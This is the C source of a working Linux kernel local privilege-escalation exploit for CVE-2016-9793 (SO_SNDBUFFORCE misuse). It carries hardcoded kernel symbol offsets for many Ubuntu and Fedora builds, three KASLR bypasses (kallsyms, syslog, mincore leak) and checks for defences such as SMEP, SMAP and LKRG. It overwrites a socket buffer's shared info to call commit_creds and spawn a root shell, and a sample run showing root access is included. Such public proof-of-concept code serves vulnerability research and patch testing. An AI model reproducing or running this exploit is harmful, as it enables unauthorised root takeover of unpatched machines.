/* Linux SO_{SND|RCV}BUFFORCE CAP_NET_ADMIN -> root LPE exploit (CVE-2016-9793)
 *
 * Includes KASLR bypass. No SMEP/SMAP bypass.
 * CAP_NET_ADMIN capability is required (setcap cap_net_admin+ep).
 * Affected kernels: 3.11 -> 4.8
 * https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
 * Andrey Konovalov <andreyknvl@gmail.com>
 * ---
 * Updated by <bcoles@gmail.com>
 * - add system checks
 * - add KASLR bypasses
 * - add additional Ubuntu/Fedora kernel targets
 * - add automatic targeting for Ubuntu/Fedora kernels
 * https://github.com/bcoles/kernel-exploits/tree/master/CVE-2016-9793
 * ---
 * test@ubuntu-16-04-x64:/tmp$ gcc cve-2016-9793.c -lpthread -Wall 
 * test@ubuntu-16-04-x64:/tmp$ sudo setcap cap_net_admin+ep ./a.out
 * test@ubuntu-16-04-x64:/tmp$ ./a.out 
 * Linux SO_{SND|RCV}BUFFORCE CAP_NET_ADMIN -> root LPE exploit (CVE-2016-9793)
 * [.] checking system...
 * [.] checking kernel version...
 * [.] kernel version '4.4.0-47-generic #68-Ubuntu' detected
 * [.] KASLR bypass enabled, getting kernel base address
 * [.] trying /proc/kallsyms...
 * [-] kernel base not found in /proc/kallsyms
 * [.] trying syslog...
 * [.] done, kernel text: ffffffff81000000
 * [.] userspace payload mmapped at 0xfffff000
 * [.] overwriting thread started
 * [.] sockets opened
 * [.] sock->sk_sndbuf set to fffffe00
 * [.] writing to socket
 * [+] got r00t
 * # id
 * uid=0(root) gid=0(root) groups=0(root)
 */

#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/sysinfo.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#define DEBUG

#ifdef DEBUG
#define dprintf printf
#else
#define dprintf
#endif

#define ENABLE_SYSTEM_CHECKS 1
#define ENABLE_KASLR_BYPASS 1

#if ENABLE_KASLR_BYPASS
#define KERNEL_BASE_MIN 0xffffffff00000000ul
#define KERNEL_BASE_MAX 0xffffffffff000000ul
#define ENABLE_KASLR_BYPASS_KALLSYMS 1
#define ENABLE_KASLR_BYPASS_SYSLOG 1
#define ENABLE_KASLR_BYPASS_MINCORE 1
#endif

// Can be overwritten by argv[1]
char *SHELL = "/bin/sh";

// Will be overwritten if ENABLE_KASLR_BYPASS is enabled (1)
unsigned long KERNEL_BASE = 0xffffffff81000000ul;

// Will be overwritten by detect_versions().
int kernel = -1;

struct kernel_info {
  const char *kernel_version;
  uint64_t commit_creds;
  uint64_t prepare_kernel_cred;
};

struct kernel_info kernels[] = {
    {"4.5.5-300.fc24.x86_64 #1", 0xc65c0, 0xc6960},
    {"4.8.6-300.fc25.x86_64 #1", 0xc2880, 0xc2c00},

    {"3.19.0-32-generic #37~14.04.1-Ubuntu", 0x95730, 0x95a30},
    {"4.2.0-18-generic #22~14.04.1-Ubuntu", 0x96d50, 0x97040},
    {"4.2.0-41-generic #48~14.04.1-Ubuntu", 0x996e0, 0x999c0},
    {"4.4.0-21-generic #37~14.04.1-Ubuntu", 0x9d7a0, 0x9da80},
    {"4.4.0-22-generic #40~14.04.1-Ubuntu", 0x9d7e0, 0x9dac0},
    {"4.4.0-24-generic #43~14.04.1-Ubuntu", 0x9d5f0, 0x9d8d0},
    {"4.4.0-28-generic #47~14.04.1-Ubuntu", 0x9d760, 0x9da40},
    {"4.4.0-31-generic #50~14.04.1-Ubuntu", 0x9d760, 0x9da40},
    {"4.4.0-34-generic #53~14.04.1-Ubuntu", 0x9d760, 0x9da40},
    {"4.4.0-36-generic #55~14.04.1-Ubuntu", 0x9d770, 0x9da50},
    {"4.4.0-38-generic #57~14.04.1-Ubuntu", 0x9d820, 0x9db00},
    {"4.4.0-42-generic #62~14.04.1-Ubuntu", 0x9d870, 0x9db50},
    {"4.4.0-45-generic #66~14.04.1-Ubuntu", 0x9d870, 0x9db50},
    {"4.4.0-47-generic #68~14.04.1-Ubuntu", 0x9d940, 0x9dc20},
    {"4.4.0-51-generic #72~14.04.1-Ubuntu", 0x9d920, 0x9dc00},
    {"4.4.0-57-generic #78~14.04.1-Ubuntu", 0x9ebb0, 0x9ee90},

    {"3.13.0-32-generic #57-Ubuntu", 0x90930, 0x90c30},
    {"4.4.0-21-generic #37-Ubuntu", 0xa21c0, 0xa25b0},
    {"4.4.0-22-generic #40-Ubuntu", 0xa2220, 0xa2610},
    {"4.4.0-24-generic #43-Ubuntu", 0xa2340, 0xa2730},
    {"4.4.0-28-generic #47-Ubuntu", 0xa24a0, 0xa2890},
    {"4.4.0-31-generic #50-Ubuntu", 0xa24a0, 0xa2890},
    {"4.4.0-34-generic #53-Ubuntu", 0xa24a0, 0xa2890},
    {"4.4.0-36-generic #55-Ubuntu", 0xa24a0, 0xa2890},
    {"4.4.0-38-generic #57-Ubuntu", 0xa2570, 0xa2960},
    {"4.4.0-42-generic #62-Ubuntu", 0xa25c0, 0xa29b0},
    {"4.4.0-45-generic #66-Ubuntu", 0xa25c0, 0xa29b0},
    {"4.4.0-47-generic #68-Ubuntu", 0xa2680, 0xa2a70},
    {"4.4.0-51-generic #72-Ubuntu", 0xa2670, 0xa2a60},
    {"4.4.0-57-generic #78-Ubuntu", 0xa28a0, 0xa2c90},
    {"4.4.0-21-lowlatency #37-Ubuntu", 0xa3150, 0xa3560},
    {"4.4.0-22-lowlatency #40-Ubuntu", 0xa31c0, 0xa35d0},
    {"4.4.0-24-lowlatency #43-Ubuntu", 0xa32e0, 0xa36f0},
    {"4.4.0-28-lowlatency #47-Ubuntu", 0xa3450, 0xa3860},
    {"4.4.0-31-lowlatency #50-Ubuntu", 0xa3450, 0xa3860},
    {"4.4.0-34-lowlatency #53-Ubuntu", 0xa3450, 0xa3860},
    {"4.4.0-36-lowlatency #55-Ubuntu", 0xa3430, 0xa3840},
    {"4.4.0-38-lowlatency #57-Ubuntu", 0xa3500, 0xa3910},
    {"4.4.0-42-lowlatency #62-Ubuntu", 0xa3560, 0xa3970},
};

#define COMMIT_CREDS (KERNEL_BASE + kernels[kernel].commit_creds)
#define PREPARE_KERNEL_CRED (KERNEL_BASE + kernels[kernel].prepare_kernel_cred)

typedef unsigned long
    __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long
    __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

void get_root(void) {
  ((_commit_creds)(COMMIT_CREDS))(
      ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));
}

struct ubuf_info_t {
  uint64_t callback; // void (*callback)(struct ubuf_info *, bool)
  uint64_t ctx;      // void *
  uint64_t desc;     // unsigned long
};

struct skb_shared_info_t {
  uint8_t nr_frags;        // unsigned char
  uint8_t tx_flags;        // __u8
  uint16_t gso_size;       // unsigned short
  uint16_t gso_segs;       // unsigned short
  uint16_t gso_type;       // unsigned short
  uint64_t frag_list;      // struct sk_buff *
  uint64_t hwtstamps;      // struct skb_shared_hwtstamps
  uint32_t tskey;          // u32
  uint32_t ip6_frag_id;    // __be32
  uint32_t dataref;        // atomic_t
  uint64_t destructor_arg; // void *
  uint8_t frags[16][17];   // skb_frag_t frags[MAX_SKB_FRAGS];
};

// sk_sndbuf = 0xffffff00 => skb_shinfo(skb) = 0x00000000fffffed0
#define SNDBUF 0xffffff00
#define SHINFO 0x00000000fffffed0ul

struct ubuf_info_t ubuf_info = {(uint64_t)&get_root, 0, 0};
struct skb_shared_info_t *skb_shared_info = (struct skb_shared_info_t *)SHINFO;

#define SKBTX_DEV_ZEROCOPY (1 << 3)

void *skb_thr(void *arg) {
  while (1) {
    skb_shared_info->destructor_arg = (uint64_t)&ubuf_info;
    skb_shared_info->tx_flags |= SKBTX_DEV_ZEROCOPY;
  }
}

int sockets[2];

void write_thr(void *arg) {
  // Write blocks until setsockopt(SO_SNDBUF).
  write(sockets[1], "\x5c", 1);

  if (getuid() == 0) {
    dprintf("[+] got r00t\n");
    execl(SHELL, SHELL, NULL);
    perror("execl()");
  }

  dprintf("[-] something went wrong\n");
}

struct utsname get_kernel_version() {
  struct utsname u;
  int rv = uname(&u);
  if (rv != 0) {
    dprintf("[-] uname()\n");
    exit(EXIT_FAILURE);
  }
  return u;
}

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#define KERNEL_VERSION_SIZE_BUFFER 512

void detect_versions() {
  struct utsname u;
  char kernel_version[KERNEL_VERSION_SIZE_BUFFER];

  u = get_kernel_version();

  if (strstr(u.machine, "64") == NULL) {
    dprintf("[-] system is not using a 64-bit kernel\n");
    exit(EXIT_FAILURE);
  }

  char *u_ver = strtok(u.version, " ");
  snprintf(kernel_version, KERNEL_VERSION_SIZE_BUFFER, "%s %s", u.release,
           u_ver);

  int i;
  for (i = 0; i < ARRAY_SIZE(kernels); i++) {
    if (strcmp(kernel_version, kernels[i].kernel_version) == 0) {
      dprintf("[.] kernel version '%s' detected\n", kernels[i].kernel_version);
      kernel = i;
      return;
    }
  }
  dprintf("[-] kernel version '%s' not recognized\n", kernel_version);
  exit(EXIT_FAILURE);
}

#define CHUNK_SIZE 1024

int read_file(const char *file, char *buffer, int max_length) {
  int f = open(file, O_RDONLY);
  if (f == -1)
    return -1;
  int bytes_read = 0;
  while (1) {
    int bytes_to_read = CHUNK_SIZE;
    if (bytes_to_read > max_length - bytes_read)
      bytes_to_read = max_length - bytes_read;

    int rv = read(f, &buffer[bytes_read], bytes_to_read);
    if (rv == -1)
      return -1;

    bytes_read += rv;
    if (rv == 0)
      return bytes_read;
  }
}

#define PROC_CPUINFO_LENGTH 4096

void check_env() {
  int min_procs = 2;
  char *found;

  int nprocs = 0;
  nprocs = get_nprocs_conf();

  if (nprocs < min_procs) {
    dprintf("[-] system has less than %d processor cores\n", min_procs);
    exit(EXIT_FAILURE);
  }

  char buffer[PROC_CPUINFO_LENGTH];
  char *path = "/proc/cpuinfo";
  int length = read_file(path, &buffer[0], PROC_CPUINFO_LENGTH);
  if (length == -1) {
    dprintf("[-] open/read(%s): %m\n", path);
    exit(EXIT_FAILURE);
  }

  found = memmem(&buffer[0], length, "smep", 4);
  if (found != NULL) {
    dprintf("[-] SMEP detected, no bypass available\n");
    exit(EXIT_FAILURE);
  }

  found = memmem(&buffer[0], length, "smap", 4);
  if (found != NULL) {
    dprintf("[-] SMAP detected, no bypass available\n");
    exit(EXIT_FAILURE);
  }

  struct stat st;

  if (stat("/dev/grsec", &st) == 0) {
    dprintf("[!] Warning: grsec is in use\n");
  }

  if (stat("/proc/sys/lkrg", &st) == 0) {
    dprintf("[!] Warning: lkrg is in use\n");
  }
}

// * * * * * * * * * * * * * * kallsyms KASLR bypass * * * * * * * * * * * * * *
// https://grsecurity.net/~spender/exploits/exploit.txt

#if ENABLE_KASLR_BYPASS_KALLSYMS
unsigned long get_kernel_addr_kallsyms() {
  FILE *f;
  unsigned long addr = 0;
  char dummy;
  char sname[256];
  char *name = "startup_64";
  char *path = "/proc/kallsyms";

  dprintf("[.] trying %s...\n", path);
  f = fopen(path, "r");
  if (f == NULL) {
    dprintf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  int ret = 0;
  while (ret != EOF) {
    ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
    if (ret == 0) {
      fscanf(f, "%s\n", sname);
      continue;
    }
    if (!strcmp(name, sname)) {
      fclose(f);
      if (addr == 0) {
        dprintf("[-] kernel base not found in %s\n", path);
      }
      return addr;
    }
  }

  fclose(f);
  dprintf("[-] kernel base not found in %s\n", path);
  return 0;
}
#endif

// * * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *
// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c

#if ENABLE_KASLR_BYPASS_SYSLOG
#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

int mmap_syslog(char **buffer, int *size) {
  *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
  if (*size == -1) {
    dprintf("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER): %m\n");
    return 1;
  }

  *size = (*size / getpagesize() + 1) * getpagesize();
  *buffer = (char *)mmap(NULL, *size, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
  if (*size == -1) {
    dprintf("[-] klogctl(SYSLOG_ACTION_READ_ALL): %m\n");
    return 1;
  }

  return 0;
}

unsigned long get_kernel_addr_syslog_trusty(char *buffer, int size) {
  const char *needle1 = "Freeing unused";
  char *substr = (char *)memmem(&buffer[0], size, needle1, strlen(needle1));
  if (substr == NULL)
    return 0;

  int start = 0;
  int end = 0;
  for (end = start; substr[end] != '-'; end++)
    ;

  const char *needle2 = "ffffff";
  substr =
      (char *)memmem(&substr[start], end - start, needle2, strlen(needle2));
  if (substr == NULL)
    return 0;

  char *endptr = &substr[16];
  unsigned long addr = strtoul(&substr[0], &endptr, 16);

  addr &= 0xffffffffff000000ul;

  if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
    return addr;

  return 0;
}

unsigned long get_kernel_addr_syslog() {
  unsigned long addr = 0;
  char *syslog;
  int size;

  dprintf("[.] trying syslog...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  addr = get_kernel_addr_syslog_trusty(syslog, size);

  if (!addr)
    dprintf("[-] kernel base not found in syslog\n");

  return addr;
}
#endif

// * * * * * * * * * * * * * * mincore KASLR bypass * * * * * * * * * * * * * *
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1431

#if ENABLE_KASLR_BYPASS_MINCORE
unsigned long get_kernel_addr_mincore() {
  unsigned char buf[getpagesize() / sizeof(unsigned char)];
  unsigned long iterations = 20000000;
  unsigned long addr = 0;

  dprintf("[.] trying mincore info leak...\n");

  if (strstr(kernels[kernel].kernel_version, "4.4.0-") == NULL) {
    dprintf("[-] target kernel does not permit mincore info leak\n");
    return 0;
  }

  /* A MAP_ANONYMOUS | MAP_HUGETLB mapping */
  if (mmap((void *)0x66000000, 0x20000000000, PROT_NONE,
           MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1,
           0) == MAP_FAILED) {
    dprintf("[-] mmap(): %m\n");
    return 0;
  }

  int i;
  for (i = 0; i <= iterations; i++) {
    /* Touch a mishandle with this type mapping */
    if (mincore((void *)0x86000000, 0x1000000, buf)) {
      dprintf("[-] mincore(): %m\n");
      return 0;
    }

    int n;
    for (n = 0; n < getpagesize() / sizeof(unsigned char); n++) {
      addr = *(unsigned long *)(&buf[n]);
      /* Kernel address space */
      if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX) {
        addr &= 0xffffffffff000000ul;
        if (munmap((void *)0x66000000, 0x20000000000)) {
          dprintf("[-] munmap(): %m\n");
        }
        return addr;
      }
    }
  }

  if (munmap((void *)0x66000000, 0x20000000000))
    dprintf("[-] munmap(): %m\n");

  dprintf("[-] kernel base not found in mincore info leak\n");
  return 0;
}
#endif

unsigned long get_kernel_addr() {
  unsigned long addr = 0;

#if ENABLE_KASLR_BYPASS_KALLSYMS
  addr = get_kernel_addr_kallsyms();
  if (addr)
    return addr;
#endif

#if ENABLE_KASLR_BYPASS_SYSLOG
  addr = get_kernel_addr_syslog();
  if (addr)
    return addr;
#endif

#if ENABLE_KASLR_BYPASS_MINCORE
  addr = get_kernel_addr_mincore();
  if (addr)
    return addr;
#endif

  dprintf("[-] KASLR bypass failed, kernel base not found\n");
  exit(EXIT_FAILURE);

  return 0;
}

int main(int argc, char *argv[]) {
  void *addr;
  int rv;
  uint32_t sndbuf;

  if (argc > 1)
    SHELL = argv[1];

  dprintf("Linux SO_{SND|RCV}BUFFORCE CAP_NET_ADMIN -> root LPE exploit "
          "(CVE-2016-9793)\n");

#if ENABLE_SYSTEM_CHECKS
  dprintf("[.] checking system...\n");
  check_env();
#endif

  dprintf("[.] checking kernel version...\n");
  detect_versions();

#if ENABLE_KASLR_BYPASS
  dprintf("[.] KASLR bypass enabled, getting kernel base address\n");
  KERNEL_BASE = get_kernel_addr();
  dprintf("[.] done, kernel text: %lx\n", KERNEL_BASE);
#endif

  addr = mmap((void *)(SHINFO & 0xfffffffffffff000ul), 0x1000ul,
              PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,
              -1, 0);
  if (addr != (void *)(SHINFO & 0xfffffffffffff000ul)) {
    perror("mmap()");
    exit(EXIT_FAILURE);
  }

  dprintf("[.] userspace payload mmapped at %p\n", addr);

  pthread_t skb_th;
  rv = pthread_create(&skb_th, 0, skb_thr, NULL);
  if (rv != 0) {
    perror("pthread_create()");
    exit(EXIT_FAILURE);
  }
  usleep(10000);

  dprintf("[.] overwriting thread started\n");

  rv = socketpair(AF_LOCAL, SOCK_STREAM, 0, &sockets[0]);
  if (rv != 0) {
    perror("socketpair()");
    exit(EXIT_FAILURE);
  }

  dprintf("[.] sockets opened\n");

  sndbuf = SNDBUF;
  rv = setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUFFORCE, &sndbuf,
                  sizeof(sndbuf));
  if (rv != 0) {
    perror("setsockopt()");
    exit(EXIT_FAILURE);
  }

  dprintf("[.] sock->sk_sndbuf set to %x\n", SNDBUF * 2);

  pthread_t write_th;
  rv = pthread_create(&write_th, 0, (void *)write_thr, NULL);
  if (rv != 0) {
    perror("pthread_create()");
    exit(EXIT_FAILURE);
  }
  usleep(10000);

  dprintf("[.] writing to socket\n");

  // Wake up blocked write.
  rv = setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  if (rv != 0) {
    perror("setsockopt()");
    exit(EXIT_FAILURE);
  }
  usleep(10000);

  close(sockets[0]);
  close(sockets[1]);

  return 0;
}
